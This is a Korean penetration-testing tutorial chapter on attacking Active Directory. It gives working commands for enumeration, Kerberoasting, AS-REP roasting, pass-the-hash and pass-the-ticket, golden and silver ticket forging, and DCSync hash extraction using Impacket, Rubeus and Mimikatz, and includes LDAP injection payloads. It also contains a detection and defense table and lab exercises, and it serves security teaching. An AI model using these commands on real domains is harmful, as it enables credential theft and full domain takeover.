# Active Directory 공격

**이전**: [13. 권한 상승 — 윈도우](./13_Privilege_Escalation_Windows.md) | **다음**: [15. 사후 익스플로잇](./15_Post_Exploitation.md)

---

Active Directory(AD)는 전 세계 수백만 조직의 인증, 권한 부여, 리소스 접근을 관리하는 기업 윈도우 환경의 핵심이다. AD가 신원 관리를 중앙 집중화하기 때문에, AD를 손상시키면 공격자는 환경 내 거의 모든 리소스에 접근할 수 있다.

> **중요**: AD 공격은 인가된 랩 환경이나 계약된 침투 테스트 업무에서만 수행해야 한다.

**난이도**: ⭐⭐⭐⭐

## 학습 목표

1. Active Directory 아키텍처와 인증 이해
2. BloodHound와 PowerView를 사용한 AD 열거
3. Kerberoasting을 통한 서비스 계정 해시 추출
4. Pass-the-Hash 및 Pass-the-Ticket 공격 실행
5. 골든 및 실버 Kerberos 티켓 위조
6. DCSync 공격으로 도메인 크리덴셜(credential) 추출
7. 초기 접근에서 도메인 관리자까지의 공격 경로 매핑
8. AD 강화 및 모니터링 전략 구현

---

## 목차

1. [Active Directory 아키텍처](#1-active-directory-아키텍처)
2. [BloodHound를 사용한 AD 열거](#2-bloodhound를-사용한-ad-열거)
3. [Kerberos 인증 공격](#3-kerberos-인증-공격)
4. [Kerberoasting](#4-kerberoasting)
5. [AS-REP Roasting](#5-as-rep-roasting)
6. [Pass-the-Hash 및 Pass-the-Ticket](#6-pass-the-hash-및-pass-the-ticket)
7. [골든 및 실버 티켓](#7-골든-및-실버-티켓)
8. [DCSync 공격](#8-dcsync-공격)
9. [LDAP 인젝션](#9-ldap-인젝션)
10. [AD 방어 및 탐지](#10-ad-방어-및-탐지)
11. [연습 문제](#11-연습-문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. Active Directory 아키텍처

### 1.1 핵심 구성 요소

- **도메인 컨트롤러(Domain Controller, DC)**: AD 데이터베이스(NTDS.dit)를 호스팅하는 서버
- **포레스트(Forest)**: 최상위 AD 컨테이너(도메인들의 집합)
- **도메인(Domain)**: 포레스트 내의 관리 경계
- **조직 구성 단위(Organizational Unit, OU)**: 객체를 조직화하기 위한 컨테이너
- **그룹 정책 객체(Group Policy Object, GPO)**: OU에 적용되는 구성 정책

### 1.2 인증 프로토콜

| 프로토콜 | 용도 | 공격 표면 |
|----------|-------|-----------|
| NTLM | 레거시 인증 | Pass-the-Hash, 릴레이 |
| Kerberos | 주요 AD 인증 | Kerberoasting, 골든 티켓 |
| LDAP | 디렉터리 쿼리 | LDAP 인젝션, 열거 |

---

## 2. BloodHound를 사용한 AD 열거

BloodHound는 그래프 이론을 사용하여 Active Directory 내의 공격 경로를 식별한다.

```powershell
# Collect data with SharpHound
.\SharpHound.exe --CollectionMethods All --Domain corp.local

# Or with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Import JSON into BloodHound
# Look for: Shortest path to Domain Admin
#           Users with DCSync rights
#           Kerberoastable accounts
```

### 2.1 PowerView 열거

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | Select samaccountname, description
Get-DomainUser -SPN  # Kerberoastable accounts

# Groups
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# GPOs
Get-DomainGPO | Select displayname, gpcfilesyspath

# ACLs
Find-InterestingDomainAcl
```

---

## 3. Kerberos 인증 공격

### 3.1 Kerberos 인증 흐름

```
1. AS-REQ: Client → KDC (request TGT with password hash)
2. AS-REP: KDC → Client (TGT encrypted with krbtgt hash)
3. TGS-REQ: Client → KDC (request service ticket with TGT)
4. TGS-REP: KDC → Client (service ticket encrypted with service hash)
5. AP-REQ: Client → Service (present service ticket)
```

---

## 4. Kerberoasting

Kerberoasting은 SPN(서비스 주체 이름)이 등록된 계정의 서비스 티켓을 요청한 후 오프라인에서 크래킹하는 기법이다.

```bash
# Using Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 5. AS-REP Roasting

Kerberos 사전 인증(pre-authentication)이 비활성화된 계정을 대상으로 한다.

```bash
# Find vulnerable accounts
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## 6. Pass-the-Hash 및 Pass-the-Ticket

### 6.1 Pass-the-Hash

평문 비밀번호를 알지 못해도 NTLM 해시를 직접 사용하여 인증한다:

```bash
# Using Impacket
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:hash corp.local/admin@10.0.0.1
wmiexec.py -hashes :hash corp.local/admin@10.0.0.1

# Using CrackMapExec
crackmapexec smb 10.0.0.0/24 -u admin -H <ntlm_hash>
```

### 6.2 Pass-the-Ticket

Kerberos 티켓(TGT 또는 TGS)을 사용하여 인증한다:

```bash
# Export tickets with Rubeus
.\Rubeus.exe dump /service:krbtgt

# Import ticket with Mimikatz
kerberos::ptt ticket.kirbi

# Or with Impacket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/admin@dc01.corp.local
```

---

## 7. 골든 및 실버 티켓

### 7.1 골든 티켓(Golden Ticket)

krbtgt 해시를 사용하여 위조된 TGT로, 도메인 내 모든 서비스에 대한 무제한 접근을 제공한다.

```bash
# Requires: krbtgt NTLM hash, domain SID
# Using Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Using Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

### 7.2 실버 티켓(Silver Ticket)

서비스 계정의 해시를 사용하여 위조된 서비스 티켓으로, 특정 서비스에 대한 접근을 제공한다.

```bash
# Using Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:<service_hash> /ptt
```

---

## 8. DCSync 공격

DCSync는 AD 데이터베이스를 복제하여 모든 비밀번호 해시를 추출한다.

```bash
# Requires: Replicating Directory Changes privileges
# Using Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

# Using Impacket
secretsdump.py corp.local/admin:password@10.0.0.1

# Extract all hashes
secretsdump.py -just-dc corp.local/admin:password@10.0.0.1
```

---

## 9. LDAP 인젝션

```python
"""
LDAP injection testing payloads.

Demonstrates how LDAP queries can be manipulated
when user input is not properly sanitized.
"""

# Vulnerable LDAP query pattern:
# (&(uid={user_input})(password={pass_input}))

LDAP_INJECTION_PAYLOADS = [
    # Authentication bypass
    ("*", "Wildcard — matches any value"),
    ("admin)(&)", "Close filter, add always-true condition"),
    ("admin)(|(password=*)", "OR injection to bypass password check"),
    ("*)(uid=*))(|(uid=*", "Extract all users"),

    # Information disclosure
    ("*)(objectClass=*", "Enumerate all object classes"),
    ("*)(cn=*", "Enumerate all common names"),
]

# Defense: Always use parameterized LDAP queries
# Python-ldap example:
# conn.search_s(base_dn, ldap.SCOPE_SUBTREE,
#              f"(uid={ldap.filter.escape_filter_chars(user_input)})")


if __name__ == "__main__":
    print("LDAP Injection Payloads")
    print("=" * 50)
    for payload, desc in LDAP_INJECTION_PAYLOADS:
        print(f"  Payload: {payload}")
        print(f"  Purpose: {desc}\n")
```

---

## 10. AD 방어 및 탐지

| 공격 | 탐지 | 방어 |
|------|------|------|
| Kerberoasting | 다수의 SPN에 대한 TGS 요청 모니터링 | 서비스 계정에 강력한 비밀번호 사용 |
| AS-REP Roasting | 사전 인증 없는 AS-REQ 모니터링 | 모든 계정에 사전 인증 활성화 |
| Pass-the-Hash | 비정상 출처의 NTLM 인증 탐지 | NTLM 비활성화, Credential Guard 사용 |
| 골든 티켓 | 비정상 수명의 TGT 모니터링 | krbtgt 비밀번호 정기적 교체 |
| DCSync | 비DC 장비의 복제 요청 모니터링 | 복제 권한 제한 |
| BloodHound | LDAP 열거 패턴 탐지 | 민감한 AD 쿼리 모니터링 |

---

## 11. 연습 문제

1. **AD 열거**: 랩 AD 환경을 구축하고 BloodHound로 열거한다. 도메인 관리자(Domain Admin)까지의 경로를 매핑한다.
2. **Kerberoasting**: 랩 환경에서 Kerberoasting 가능한 서비스 계정을 찾아 크래킹한다.
3. **Pass-the-Hash**: 캡처한 NTLM 해시를 사용하여 다른 머신으로 횡적 이동한다.
4. **골든 티켓**: krbtgt 해시를 획득한 후 골든 티켓을 위조하여 모든 서비스에 접근한다.
5. **DCSync**: DCSync 공격을 수행하여 모든 도메인 해시를 추출한다.
6. **전체 체인**: 초기 거점 확보부터 도메인 관리자까지의 전체 AD 공격 체인을 완료한다.

---

## 12. 요약

Active Directory 공격은 기업 신원 관리의 핵심을 표적으로 한다:

- **BloodHound**는 AD 신뢰 관계를 통한 공격 경로를 매핑한다
- **Kerberoasting**은 크래킹 가능한 서비스 계정 해시를 추출한다
- **Pass-the-Hash**는 NTLM 해시를 재사용하여 횡적 이동한다
- **골든 티켓**은 지속적이고 무제한적인 도메인 접근을 제공한다
- **DCSync**은 전체 크리덴셜 데이터베이스를 추출한다
- 방어에는 강력한 비밀번호, 모니터링, 최소 권한 원칙이 필요하다

---

## 13. 참고 자료

- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/fortra/impacket
- Rubeus: https://github.com/GhostPack/Rubeus
- Mimikatz: https://github.com/gentilkiwi/mimikatz
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Active Directory Security: https://adsecurity.org/
